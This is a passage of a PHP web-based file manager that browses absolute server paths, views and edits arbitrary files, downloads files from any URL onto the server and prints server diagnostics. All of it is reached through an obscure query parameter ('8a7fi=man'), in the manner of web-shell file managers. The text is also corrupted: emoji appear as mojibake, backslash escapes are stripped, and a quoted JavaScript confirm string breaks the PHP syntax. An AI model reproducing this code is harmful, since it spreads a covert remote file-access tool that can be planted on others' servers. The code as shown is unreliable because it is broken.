                        foreach ($hidden_patterns as $pattern) {
                            if (fnmatch($pattern, $file)) {
                                $show = false;
                                break;
                            }
                        }
                        
                        if ($show) {
                            $nav_path_for_item = '';
                            if ($current_path === '/') {
                                $nav_path_for_item = '/' . $file;
                            } else if (!empty($current_path)) {
                                $nav_path_for_item = rtrim($current_path, '/') . '/' . $file;
                            } else { // current_path is empty
                                $nav_path_for_item = $file;
                            }
                            $results[] = array(
                                'name' => $file,
                                'type' => $is_dir ? 'dir' : 'file',
                                'size' => $size,
                                'modified' => $modified,
                                'path' => $nav_path_for_item,
                                'permissions' => $permissions
                            );
                        }
                    }
                }
                
                // Use @ to suppress errors in case of issues with non-UTF8 characters
                echo @php52_json_encode(array('success' => true, 'results' => $results));
            } else {
                echo php52_json_encode(array('error' => "Cannot read directory"));
            }
            break;
            
        case 'view_file':
            $file_to_view_param = $_GET['file'];
            // $current_path should be the directory of the file, taken from the &path= parameter
            // $full_path is already calculated based on $current_path and is the directory containing the file.
            
            $file_to_view_basename = basename($file_to_view_param); // Security: operate on basename
            $file_full_path = $full_path . DIRECTORY_SEPARATOR . $file_to_view_basename;

            if (is_file($file_full_path) && is_readable($file_full_path)) {
                $file_size = filesize($file_full_path);
                $max_viewable_size = MAX_VIEWABLE_FILE_SIZE; // Use constant instead of hardcoded value
                
                header('Content-Type: text/html; charset=utf-8');
                echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>View File: '.htmlspecialchars($file_to_view_basename).'</title>';
                echo '<style>body{font-family: Arial, sans-serif; margin: 20px;} pre{background-color: #f4f4f4; padding: 15px; border: 1px solid #ddd; white-space: pre-wrap; word-wrap: break-word;} a{text-decoration:none; color:#007bff; padding:5px; border:1px solid #ddd; background-color:#f8f8f8; border-radius:3px;} a:hover{background-color:#e0e0e0;} .warning{background-color:#fff3cd; border:1px solid #ffeaa7; color:#856404; padding:10px; margin:10px 0; border-radius:4px;}</style>';
                echo '</head><body>';
                echo '<h1>Viewing File: '.htmlspecialchars($file_to_view_basename).'</h1>';
                echo '<p>Full Path: '.htmlspecialchars($file_full_path).'</p>';
                echo '<p>File Size: '.format_size($file_size).'</p>';
                echo '<p><a href="'.build_url($current_path).'">Back to File List</a></p>';
                
                if ($file_size > $max_viewable_size) {
                    echo '<div class="warning">';
                    echo '<strong>Warning:</strong> This file is large ('.format_size($file_size).'). ';
                    echo 'Viewing the entire file may cause memory issues. Showing first '.format_size($max_viewable_size).' only.';
                    echo '</div>';
                    
                    // Read only the first part of the file
                    $handle = fopen($file_full_path, 'r');
                    if ($handle) {
                        $content = fread($handle, $max_viewable_size);
                        fclose($handle);
                        echo '<hr><pre>'.htmlspecialchars($content);
                        if ($file_size > $max_viewable_size) {
                            echo "nn... [File truncated - showing first ".format_size($max_viewable_size)." of ".format_size($file_size)."]";
                        }
                        echo '</pre><hr>';
                    } else {
                        echo '<div class="error">Error: Could not open file for reading.</div>';
                    }
                } else {
                    // File is small enough to load completely
                    $content = file_get_contents($file_full_path);
                    echo '<hr><pre>'.htmlspecialchars($content).'</pre><hr>';
                }
                
                echo '<p><a href="'.build_url($current_path).'">Back to File List</a></p>';
                echo '</body></html>';
                exit;
            } else {
                // Store error message in session and redirect
                $_SESSION['file_action_error'] = "Cannot view file: '" . htmlspecialchars($file_to_view_basename) . "'. File not found or not readable in the path: " . htmlspecialchars($full_path);
                header('Location: ' . build_url($current_path));
                exit;
            }
            break;
            
        default:
            echo php52_json_encode(array('error' => "Invalid action"));
            break;
    }
    exit;
}

// Handle monitor log viewing
if (isset($_GET['view_monitor_log'])) {
    $monitor_log = get_monitor_log($monitor_log_file, 50);
    $monitor_status = get_monitor_status($monitor_status_file);
    
    echo '<!DOCTYPE html><html><head><title>Monitoring Log</title>';
    echo '<style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .log-entry { background: #f8f9fa; padding: 15px; margin: 15px 0; border-left: 4px solid #007bff; border-radius: 5px; }
        .session-info { background: #e9ecef; padding: 10px; margin: 10px 0; border-radius: 3px; font-size: 12px; }
        .change-item { margin: 8px 0; padding: 8px; border-radius: 4px; }
        .added { background-color: #d4edda; color: #155724; border-left: 3px solid #28a745; }
        .modified { background-color: #fff3cd; color: #856404; border-left: 3px solid #ffc107; }
        .deleted { background-color: #f8d7da; color: #721c24; border-left: 3px solid #dc3545; }
        .actions { margin: 15px 0; }
        .actions a { display: inline-block; padding: 8px 15px; background: #f0f0f0; 
                    border: 1px solid #ddd; text-decoration: none; color: #333; margin-right: 10px; border-radius: 4px; }
        .actions a:hover { background: #e0e0e0; }
        .status-active { color: #28a745; font-weight: bold; }
        .status-inactive { color: #6c757d; }
        .file-details { font-size: 11px; color: #666; margin-top: 5px; }
        .scan-summary { background: #d1ecf1; padding: 8px; margin: 10px 0; border-radius: 3px; font-size: 12px; }
        .ip-info { color: #007bff; font-weight: bold; }
        .manual-check { background: #fff3cd; border-left-color: #ffc107; }
        .auto-check { background: #f8f9fa; border-left-color: #6c757d; }
    </style></head><body>';
    
    echo '<h2>Ì†ΩÌ≥ä Folder Monitoring Log</h2>';
    
    echo '<div class="actions">';
    echo '<a href="' . htmlspecialchars(build_url($current_path)) . '">Back to File Manager</a>';
    echo '</div>';
    
    echo '<div style="background: #e9ecef; padding: 10px; border-radius: 5px; margin-bottom: 20px;">';
    echo '<strong>Status:</strong> ';
    if ($monitor_status['active']) {
        echo '<span class="status-active">‚úÖ Active</span><br>';
        echo '<strong>Monitored Path:</strong> ' . htmlspecialchars($monitor_status['path']) . '<br>';
        echo '<strong>Started:</strong> ' . date('Y-m-d H:i:s', $monitor_status['started']);
    } else {
        echo '<span class="status-inactive">‚è∏Ô∏è Inactive</span>';
    }
    echo '</div>';
    
    if (empty($monitor_log)) {
        echo '<div style="text-align: center; color: #6c757d; padding: 40px;">No monitoring activity recorded yet.</div>';
    } else {
        echo '<h3>Recent Activity (Last 50 entries)</h3>';
        foreach ($monitor_log as $entry) {
            $check_type = isset($entry['session_info']['check_type']) ? $entry['session_info']['check_type'] : 'unknown';
            $entry_class = $check_type === 'manual' ? 'manual-check' : 'auto-check';
            
            echo '<div class="log-entry ' . $entry_class . '">';
            echo '<strong>Ì†ΩÌ≥Ö ' . date('Y-m-d H:i:s', $entry['timestamp']) . '</strong>';
            echo '<span style="float: right; font-size: 12px; color: #666;">' . ucfirst($check_type) . ' Check</span>';
            
            // Display session information if available
            if (isset($entry['session_info'])) {
                echo '<div class="session-info">';
                echo '<strong>Session Details:</strong><br>';
                echo 'Ì†ºÌºê <span class="ip-info">IP:</span> ' . htmlspecialchars($entry['session_info']['ip_address']) . ' | ';
                echo 'Ì†ΩÌ¥ó <strong>Session:</strong> ' . htmlspecialchars(substr($entry['session_info']['session_id'], 0, 8)) . '...<br>';
                echo 'Ì†ΩÌ∂•Ô∏è <strong>User Agent:</strong> ' . htmlspecialchars(substr($entry['session_info']['user_agent'], 0, 80)) . 
                     (strlen($entry['session_info']['user_agent']) > 80 ? '...' : '') . '<br>';
                echo 'Ì†ΩÌ≥ç <strong>Request:</strong> ' . htmlspecialchars($entry['session_info']['request_method']) . ' ' . 
                     htmlspecialchars($entry['session_info']['request_uri']);
                echo '</div>';
            }
            
            // Display scan summary if available
            if (isset($entry['scan_summary'])) {
                echo '<div class="scan-summary">';
                echo '<strong>Ì†ΩÌ≥ä Scan Summary:</strong> ';
                echo $entry['scan_summary']['total_files_scanned'] . ' files scanned, ';
                echo $entry['scan_summary']['changes_detected'] . ' changes detected in ';
                echo htmlspecialchars($entry['scan_summary']['monitored_path']);
                echo '</div>';
            }
            
            echo '<div style="margin-top: 15px;">';
            
            foreach ($entry['changes'] as $change) {
                $class = $change['type'];
                $icon = $change['type'] === 'added' ? '‚ûï' : ($change['type'] === 'modified' ? '‚úèÔ∏è' : '‚ùå');
                
                echo '<div class="change-item ' . $class . '">';
                echo $icon . ' <strong>' . strtoupper($change['type']) . ':</strong> ' . htmlspecialchars($change['file']);
                
                // Enhanced file details
                if ($change['type'] === 'modified') {
                    echo '<div class="file-details">';
                    echo 'Ì†ΩÌ≥è Size: ' . format_size($change['old_size']) . ' ‚Üí ' . format_size($change['new_size']) . ' | ';
                    echo 'Ì†ΩÌµí Modified: ' . date('Y-m-d H:i:s', $change['old_mtime']) . ' ‚Üí ' . date('Y-m-d H:i:s', $change['new_mtime']) . '<br>';
                    echo 'Ì†ΩÌ¥ê Hash: ' . $change['old_hash'] . ' ‚Üí ' . $change['new_hash'];
                    echo '</div>';
                } elseif ($change['type'] === 'added') {
                    echo '<div class="file-details">';
                    echo 'Ì†ΩÌ≥è Size: ' . format_size($change['size']) . ' | ';
                    echo 'Ì†ΩÌµí Created: ' . date('Y-m-d H:i:s', $change['mtime']) . '<br>';
                    echo 'Ì†ΩÌ¥ê Hash: ' . $change['hash'];
                    echo '</div>';
                } elseif ($change['type'] === 'deleted') {
                    echo '<div class="file-details">';
                    echo 'Ì†ΩÌ≥è Was: ' . format_size($change['old_size']) . ' | ';
                    echo 'Ì†ΩÌµí Last Modified: ' . date('Y-m-d H:i:s', $change['old_mtime']) . '<br>';
                    echo 'Ì†ΩÌ¥ê Last Hash: ' . $change['old_hash'];
                    echo '</div>';
                }
                
                echo '</div>';
            }
            
            echo '</div>';
            echo '</div>';
        }
    }
    
    echo '<div class="actions" style="margin-top: 30px;">';
    echo '<a href="' . htmlspecialchars(build_url($current_path)) . '">Back to File Manager</a>';
    echo '<form method="post" action="' . htmlspecialchars(build_url($current_path)) . '" style="display: inline-block; margin-left: 10px;">';
    echo '<button type="submit" name="clear_monitor_log" style="background-color: #dc3545; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer;" onclick="return confirm('Are you sure you want to clear all monitoring logs?');">Clear All Logs</button>';
    echo '</form>';
    echo '</div>';
    
    echo '</body></html>';
    exit;
}

// Handle viewing and editing files
if (isset($_GET['view_file'])) {
    $file_to_view = basename($_GET['view_file']); // Sanitize filename
    $file_path = $full_path . DIRECTORY_SEPARATOR . $file_to_view;
    
    if (is_file($file_path) && is_readable($file_path)) {
        $file_size = filesize($file_path);
        $max_viewable_size = MAX_VIEWABLE_FILE_SIZE; // Use constant instead of hardcoded value
        $is_writable = is_writable($file_path);
        
        // Output HTML
        echo '<!DOCTYPE html><html><head><title>View: ' . htmlspecialchars($file_to_view) . '</title>';
        echo '<style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            pre { background: #f5f5f5; padding: 10px; border: 1px solid #ddd; overflow: auto; }
            .actions { margin: 15px 0; }
            .actions a { display: inline-block; padding: 5px 10px; background: #f0f0f0; 
                        border: 1px solid #ddd; text-decoration: none; color: #333; margin-right: 10px; }
            .actions a:hover { background: #e0e0e0; }
            .warning { background-color: #fff3cd; border: 1px solid #ffeaa7; color: #856404; 
                      padding: 10px; margin: 10px 0; border-radius: 4px; }
            .info { background-color: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; 
                   padding: 10px; margin: 10px 0; border-radius: 4px; }
        </style></head><body>';
        
        echo '<h2>Viewing: ' . htmlspecialchars($file_to_view) . '</h2>';
        echo '<div class="info">File Size: ' . format_size($file_size) . '</div>';
        
        echo '<div class="actions">';
        echo '<a href="' . htmlspecialchars(build_url($current_path)) . '">Back to List</a>';
        
        // Edit link - only show if file is writable and not too large
        if ($is_writable && $file_size <= $max_viewable_size) {
            echo ' <a href="' . htmlspecialchars(build_url($current_path) . '&edit_file=' . urlencode($file_to_view)) . '">Edit File</a>';
        } else if ($is_writable) {
            echo ' <span style="color:#999;">(File too large to edit safely)</span>';
        } else {
            echo ' <span style="color:#999;">(File not writable)</span>';
        }
        echo '</div>';
        
        if ($file_size > $max_viewable_size) {
            echo '<div class="warning">';
            echo '<strong>Warning:</strong> This file is large (' . format_size($file_size) . '). ';
            echo 'Viewing the entire file may cause memory issues. Showing first ' . format_size($max_viewable_size) . ' only.';
            echo '</div>';
            
            // Read only the first part of the file
            $handle = fopen($file_path, 'r');
            if ($handle) {
                $content = fread($handle, $max_viewable_size);
                fclose($handle);
                echo '<pre>' . htmlspecialchars($content);
                if ($file_size > $max_viewable_size) {
                    echo "nn... [File truncated - showing first " . format_size($max_viewable_size) . " of " . format_size($file_size) . "]";
                }
                echo '</pre>';
            } else {
                echo '<div class="error">Error: Could not open file for reading.</div>';
            }
        } else {
            // File is small enough to load completely
            $content = file_get_contents($file_path);
            echo '<pre>' . htmlspecialchars($content) . '</pre>';
        }
        
        echo '</body></html>';
        exit;
    } else {
        $_SESSION['file_action_error'] = "Cannot view file: File not found or not readable.";
        header('Location: ' . build_url($current_path));
        exit;
    }
}

// Handle file editing
if (isset($_GET['edit_file'])) {
    $file_to_edit = basename($_GET['edit_file']); // Sanitize filename
    $file_path = $full_path . DIRECTORY_SEPARATOR . $file_to_edit;
    
    if (is_file($file_path) && is_readable($file_path)) {
        $file_size = filesize($file_path);
        $max_editable_size = MAX_EDITABLE_FILE_SIZE; // Use constant instead of hardcoded value
        $is_writable = is_writable($file_path);
        
        // Check if file is too large to edit safely
        if ($file_size > $max_editable_size) {
            echo '<!DOCTYPE html><html><head><title>File Too Large</title>';
            echo '<style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                .error { background-color: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; 
                        padding: 15px; margin: 10px 0; border-radius: 4px; }
                .actions { margin: 15px 0; }
                .actions a { display: inline-block; padding: 5px 10px; background: #f0f0f0; 
                            border: 1px solid #ddd; text-decoration: none; color: #333; margin-right: 10px; }
                .actions a:hover { background: #e0e0e0; }
            </style></head><body>';
            echo '<h2>Cannot Edit: ' . htmlspecialchars($file_to_edit) . '</h2>';
            echo '<div class="error">';
            echo '<strong>File Too Large:</strong> This file (' . format_size($file_size) . ') exceeds the maximum editable size (' . format_size($max_editable_size) . '). ';
            echo 'Editing large files can cause memory issues and browser crashes.';
            echo '</div>';
            echo '<div class="actions">';
            echo '<a href="' . htmlspecialchars(build_url($current_path)) . '">Back to List</a>';
            echo ' <a href="' . htmlspecialchars(build_url($current_path) . '&view_file=' . urlencode($file_to_edit)) . '">View File (Read-Only)</a>';
            echo '</div>';
            echo '</body></html>';
            exit;
        }
        
        $content = file_get_contents($file_path);
        
        // Output HTML
        echo '<!DOCTYPE html><html><head><title>Edit: ' . htmlspecialchars($file_to_edit) . '</title>';
        echo '<style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            textarea { width: 100%; height: 400px; padding: 10px; box-sizing: border-box; font-family: monospace; }
            .actions { margin: 15px 0; }
            .actions a, .actions button { display: inline-block; padding: 5px 10px; background: #f0f0f0; 
                        border: 1px solid #ddd; text-decoration: none; color: #333; margin-right: 10px; }
            .actions a:hover, .actions button:hover { background: #e0e0e0; }
            .info { background-color: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; 
                   padding: 10px; margin: 10px 0; border-radius: 4px; }
        </style></head><body>';
        
        echo '<h2>Editing: ' . htmlspecialchars($file_to_edit) . '</h2>';
        echo '<div class="info">File Size: ' . format_size($file_size) . '</div>';
        
        if (!$is_writable) {
            echo '<div style="color: red; padding: 10px; background: #fee; border: 1px solid #fcc; margin-bottom: 15px;">
                  Warning: This file appears to be read-only. You may not be able to save changes.</div>';
        }
        
        echo '<div class="actions">';
        echo '<a href="' . htmlspecialchars(build_url($current_path)) . '">Back to List</a>';
        echo ' <a href="' . htmlspecialchars(build_url($current_path) . '&view_file=' . urlencode($file_to_edit)) . '">View Mode</a>';
        echo '</div>';
        
        echo '<form method="post" action="' . htmlspecialchars(build_url($current_path)) . '">';
        echo '<input type="hidden" name="save_file" value="' . htmlspecialchars($file_to_edit) . '">';
        echo '<textarea name="file_content">' . htmlspecialchars($content) . '</textarea>';
        echo '<div class="actions" style="margin-top:10px;"><button type="submit">Save Changes</button></div>';
        echo '</form>';
        
        echo '</body></html>';
        exit;
    } else {
        $_SESSION['file_action_error'] = "Cannot edit file: File not found or not readable.";
        header('Location: ' . build_url($current_path));
        exit;
    }
}

// Handle file saving
if (isset($_POST['save_file']) && isset($_POST['file_content'])) {
    // Check protection mode
    if (is_monitoring_protection_active($monitor_status_file, $full_path)) {
        $_SESSION['file_action_error'] = "File save blocked: Protection mode is active for this monitored folder. Disable monitoring or turn off protection mode to save files.";
        // Redirect back to edit mode without saving
        $file_to_save = basename($_POST['save_file']);
        header('Location: ' . build_url($current_path) . '&edit_file=' . urlencode($file_to_save));
        exit;
    }
    
    $file_to_save = basename($_POST['save_file']); // Sanitize filename
    $file_path = $full_path . DIRECTORY_SEPARATOR . $file_to_save;
    $new_content = $_POST['file_content'];
    
    if (is_file($file_path)) {
        if (is_writable($file_path)) {
            if (file_put_contents($file_path, $new_content) !== false) {
                $_SESSION['file_action_success'] = "File saved successfully.";
            } else {
                $_SESSION['file_action_error'] = "Error saving file. Check permissions.";
            }
        } else {
            $_SESSION['file_action_error'] = "Cannot save: File is not writable.";
        }
    } else {
        $_SESSION['file_action_error'] = "Cannot save: File not found.";
    }
    
    // Redirect back to edit mode
    header('Location: ' . build_url($current_path) . '&edit_file=' . urlencode($file_to_save));
    exit;
}

// Handle download from URL
if (isset($_POST['download_from_url']) && $allow_upload) { // Reuse allow_upload for this feature
    // Check protection mode
    if (is_monitoring_protection_active($monitor_status_file, $full_path)) {
        $download_error = "Download blocked: Protection mode is active for this monitored folder. Disable monitoring or turn off protection mode to download files.";
    } else {
        $url_to_download = isset($_POST['url_to_download']) ? trim($_POST['url_to_download']) : '';
        $download_filename = isset($_POST['download_filename']) ? trim($_POST['download_filename']) : '';

    if (is_valid_url($url_to_download)) {
        if (empty($download_filename)) {
            $download_filename = basename(parse_url($url_to_download, PHP_URL_PATH));
        }
        // Sanitize filename: remove path components and invalid characters
        $download_filename = basename($download_filename);
        $download_filename = preg_replace("/[^a-zA-Z0-9._-]/", "", $download_filename);


        if (empty($download_filename)) {
            $download_error = "Could not determine a valid filename from the URL. Please specify one.";
        } else {
            $target_path = $full_path . DIRECTORY_SEPARATOR . $download_filename;

            // Check if allow_url_fopen is enabled
            if (ini_get('allow_url_fopen')) {
                $file_content = @file_get_contents($url_to_download);
                if ($file_content !== false) {
                    if (@file_put_contents($target_path, $file_content) !== false) {
                        $download_message = "File downloaded successfully from URL as " . htmlspecialchars($download_filename);
                    } else {
                        $download_error = "Error saving downloaded file. Check permissions for: " . htmlspecialchars($full_path);
                    }
                } else {
                    $download_error = "Error downloading file from URL. The URL might be invalid or inaccessible.";
                }
            } else {
                $download_error = "Cannot download from URL: 'allow_url_fopen' is disabled in php.ini. Please enable it or use a different method (e.g., cURL).";
            }
        }
    } else {
        $download_error = "Invalid URL provided.";
    }
    } // Close else block for protection check
}

// Format file size
function format_size($bytes) {
    if ($bytes <= 0) return '0 B';
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    
    // More compatible approach for PHP 5.3
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    
    return round($bytes, 2) . ' ' . $units[$i];
}

// Check if file is safe to view based on size
function is_file_safe_to_view($file_path) {
    if (!is_file($file_path)) return false;
    $file_size = filesize($file_path);
    return $file_size !== false && $file_size <= MAX_VIEWABLE_FILE_SIZE;
}

// Check if file is safe to edit based on size
function is_file_safe_to_edit($file_path) {
    if (!is_file($file_path)) return false;
    $file_size = filesize($file_path);
    return $file_size !== false && $file_size <= MAX_EDITABLE_FILE_SIZE;
}

// Get memory usage information
function get_memory_info() {
    $memory_limit = ini_get('memory_limit');
    $memory_usage = memory_get_usage(true);
    $memory_peak = memory_get_peak_usage(true);
    
    return array(
        'limit' => $memory_limit,
        'limit_bytes' => asBytes($memory_limit),
        'current' => $memory_usage,
        'peak' => $memory_peak,
        'available' => asBytes($memory_limit) - $memory_usage
    );
}

// File type icons
$file_icons = array(
    // Documents
    'doc' => 'Ì†ΩÌ≥Ñ', 'docx' => 'Ì†ΩÌ≥Ñ', 'pdf' => 'Ì†ΩÌ≥ï', 'txt' => 'Ì†ΩÌ≥ù', 'rtf' => 'Ì†ΩÌ≥Ñ',
    // Images
    'jpg' => 'Ì†ΩÌ∂ºÔ∏è', 'jpeg' => 'Ì†ΩÌ∂ºÔ∏è', 'png' => 'Ì†ΩÌ∂ºÔ∏è', 'gif' => 'Ì†ΩÌ∂ºÔ∏è', 'bmp' => 'Ì†ΩÌ∂ºÔ∏è', 'svg' => 'Ì†ΩÌ∂ºÔ∏è',
    // Archives
    'zip' => 'Ì†ΩÌ≥¶', 'rar' => 'Ì†ΩÌ≥¶', 'tar' => 'Ì†ΩÌ≥¶', 'gz' => 'Ì†ΩÌ≥¶', '7z' => 'Ì†ΩÌ≥¶',
    // Code
    'php' => 'Ì†ΩÌ≤ª', 'html' => 'Ì†ΩÌ≤ª', 'css' => 'Ì†ΩÌ≤ª', 'js' => 'Ì†ΩÌ≤ª', 'py' => 'Ì†ΩÌ≤ª', 'java' => 'Ì†ΩÌ≤ª',
    // Executables
    'exe' => '‚öôÔ∏è', 'sh' => '‚öôÔ∏è', 'bat' => '‚öôÔ∏è', 'cmd' => '‚öôÔ∏è',
    // Media
    'mp3' => 'Ì†ΩÌ¥ä', 'wav' => 'Ì†ΩÌ¥ä', 'ogg' => 'Ì†ΩÌ¥ä', 
    'mp4' => 'Ì†ºÌæ¨', 'avi' => 'Ì†ºÌæ¨', 'mov' => 'Ì†ºÌæ¨', 'mkv' => 'Ì†ºÌæ¨'
);

// Function to get file icon
function get_file_icon($filename) {
    global $file_icons;
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return isset($file_icons[$ext]) ? $file_icons[$ext] : 'Ì†ΩÌ≥Ñ';
}

// Function to format file permissions
function format_permissions($perms) {
    if (($perms & 0xC000) == 0xC000) $info = 's'; // Socket
    elseif (($perms & 0xA000) == 0xA000) $info = 'l'; // Symbolic Link
    elseif (($perms & 0x8000) == 0x8000) $info = '-'; // Regular
    elseif (($perms & 0x6000) == 0x6000) $info = 'b'; // Block special
    elseif (($perms & 0x4000) == 0x4000) $info = 'd'; // Directory
    elseif (($perms & 0x2000) == 0x2000) $info = 'c'; // Character special
    elseif (($perms & 0x1000) == 0x1000) $info = 'p'; // FIFO pipe
    else $info = 'u'; // Unknown

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

// IP Debug mode
if (isset($_GET['ip_debug'])) {
    echo '<!DOCTYPE html><html><head><title>IP Debug Information</title>';
    echo '<style>body{font-family:Arial,sans-serif;margin:20px;} table{border-collapse:collapse;width:100%;} th,td{border:1px solid #ddd;padding:8px;text-align:left;} th{background-color:#f2f2f2;}</style>';
    echo '</head><body>';
    echo '<h1>IP Address Detection Debug</h1>';
    echo '<h2>Current Detection: <span style="color:blue;">' . htmlspecialchars(get_client_ip()) . '</span></h2>';
    
    echo '<h3>All Available IP Headers:</h3>';
    echo '<table><tr><th>Header Name</th><th>Value</th><th>Valid IP?</th></tr>';
    
    $ip_debug = get_ip_debug_info();
    unset($ip_debug['Detected_IP']); // Remove the detected IP from list to avoid duplication
    
    $ip_headers = array(
        'REMOTE_ADDR', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 
        'HTTP_CLIENT_IP', 'HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED'
    );
    
    foreach ($ip_headers as $header) {
        $value = isset($_SERVER[$header]) ? $_SERVER[$header] : 'Not Set';
        $is_valid = 'N/A';
        
        if ($value !== 'Not Set') {
            // Check if it's a comma-separated list
            if (strpos($value, ',') !== false) {
                $ips = explode(',', $value);
                $valid_ips = array();
                foreach ($ips as $ip) {
                    $ip = trim($ip);
                    if (is_valid_ip($ip)) {
                        $valid_ips[] = $ip;
                    }
                }
                $is_valid = !empty($valid_ips) ? 'Yes (' . implode(', ', $valid_ips) . ')' : 'No';
            } else {
                $is_valid = is_valid_ip(trim($value)) ? 'Yes' : 'No';
            }
        }
        
        echo '<tr><td>' . htmlspecialchars($header) . '</td><td>' . htmlspecialchars($value) . '</td><td>' . htmlspecialchars($is_valid) . '</td></tr>';
    }
    
    echo '</table>';
    
    echo '<h3>Additional Server Information:</h3>';
    echo '<table><tr><th>Variable</th><th>Value</th></tr>';
    $server_vars = array('SERVER_NAME', 'SERVER_ADDR', 'HTTP_HOST', 'REQUEST_URI', 'HTTP_USER_AGENT');
    foreach ($server_vars as $var) {
        $value = isset($_SERVER[$var]) ? $_SERVER[$var] : 'Not Set';
        echo '<tr><td>' . htmlspecialchars($var) . '</td><td>' . htmlspecialchars($value) . '</td></tr>';
    }
    echo '</table>';
    
    echo '<p><a href="?8a7fi=man">Back to File Manager</a></p>';
    echo '</body></html>';
    exit;
}

// Diagnostics mode
if (isset($_GET['diagnostics'])) {
    header('Content-Type: text/plain');
    echo "PHP DIAGNOSTICS REPORTn";
    echo "=====================nn";
    
    echo "PHP Version: " . PHP_VERSION . "n";
    echo "Server Software: " . (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A') . "n";
    echo "Operating System: " . PHP_OS . "n";
    
    echo "nMemory Information:n";
    $memory_info = get_memory_info();
    echo "Memory Limit: " . $memory_info['limit'] . " (" . format_size($memory_info['limit_bytes']) . ")n";
    echo "Current Usage: " . format_size($memory_info['current']) . "n";
    echo "Peak Usage: " . format_size($memory_info['peak']) . "n";
    echo "Available: " . format_size($memory_info['available']) . "n";
    
    echo "nFile Size Limits:n";
    echo "Max Viewable File Size: " . format_size(MAX_VIEWABLE_FILE_SIZE) . "n";
    echo "Max Editable File Size: " . format_size(MAX_EDITABLE_FILE_SIZE) . "n";
    
    echo "nPHP Settings:n";
    $important_settings = array(
        'display_errors', 'log_errors', 'error_reporting', 
        'allow_url_fopen', 'memory_limit', 'max_execution_time',
        'open_basedir', 'disable_functions', 'post_max_size', 'upload_max_filesize'
    );
    
    foreach($important_settings as $setting) {
        echo $setting . ": " . ini_get($setting) . "n";
    }
    
    echo "nExtension Availability:n";
    $extensions = get_loaded_extensions();
    sort($extensions);
    foreach($extensions as $ext) {
        echo "- $extn";
    }
    
    echo "nIP Address Detection Debug:n";
    $ip_debug = get_ip_debug_info();
    foreach ($ip_debug as $header => $value) {
        echo "$header: $valuen";
    }
    
    echo "nFile Access Tests:n";
    $script_test_file = dirname(__FILE__) . DIRECTORY_SEPARATOR . "test_write.txt";
    $script_write_test = @file_put_contents($script_test_file, "This is a test file write at " . date('Y-m-d H:i:s'));
    echo "Write test to script directory: " . ($script_write_test !== false ? "Success ($script_write_test bytes)" : "Failed") . "n";
    
    if ($script_write_test !== false) @unlink($script_test_file);
    
    exit;
}

// Check for unzip messages in session
$unzip_messages = array();
if (isset($_SESSION['unzip_messages'])) {
    $unzip_messages = $_SESSION['unzip_messages'];
    unset($_SESSION['unzip_messages']); // Clear messages after displaying them
}

// Get directory contents
$items = array();
$dir_error = null;

if (is_dir($full_path) && is_readable($full_path)) {
    try {
        $files = scandir($full_path);
        
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                $path = $full_path . DIRECTORY_SEPARATOR . $file;
                $is_dir = is_dir($path);
                $size = $is_dir ? 0 : filesize($path);
                $modified = date('Y-m-d H:i:s', filemtime($path));
                $permissions = is_readable($path) ? format_permissions(fileperms($path)) : 'N/A';
                
                // Check if file should be hidden
                $show = true;
                foreach ($hidden_patterns as $pattern) {
                    if (fnmatch($pattern, $file)) {
                        $show = false;
                        break;
                    }
                }
                
                if ($show) {
                    // Simplified path handling - just use the file name for navigation
                    // The actual path will be calculated based on the current directory
                    $nav_path_for_item = '';
                    if ($current_path === '/') {
                        $nav_path_for_item = '/' . $file;
                    } else if (!empty($current_path)) {
                        $nav_path_for_item = rtrim($current_path, '/') . '/' . $file;
                    } else { // current_path is empty
                        $nav_path_for_item = $file;
                    }
                    $items[] = array(
                        'name' => $file,
                        'is_dir' => $is_dir,
                        'size' => $size,
                        'modified' => $modified,
                        'path' => $nav_path_for_item,
                        'permissions' => $permissions
                    );
                }
            }
        }
    } catch (Exception $e) {
        $dir_error = "Error reading directory: " . $e->getMessage();
    }
} else {
    $dir_error = "Cannot read directory. Either it doesn't exist or you don't have permission.";
}

// Sort items (folders first, then files)
function sort_items($a, $b) {
    if ($a['is_dir'] && !$b['is_dir']) return -1;
    if (!$a['is_dir'] && $b['is_dir']) return 1;
    return strcasecmp($a['name'], $b['name']);
}
usort($items, 'sort_items');

// Helper function to preserve the 8a7fi parameter in URLs
function build_url($path = '') {
    $url = '?8a7fi=man';
    if (!empty($path)) {
        $url .= '&path=' . urlencode($path);
    }
    return $url;
}

// Helper function to get safe parent path for navigation
function get_safe_parent_path($current_path, $full_path, $script_dir, $is_absolute_path) {
    if ($is_absolute_path) {
        if ($full_path === '/' || $full_path === DIRECTORY_SEPARATOR) {
            return ''; // Already at root
        }
        $parent_dir = dirname($full_path);
        if ($parent_dir === $full_path) {
            return ''; // At root-like directory
        }
        return $parent_dir;
    } else {
        if ($current_path === '') {
            // At script directory, try to go to its parent
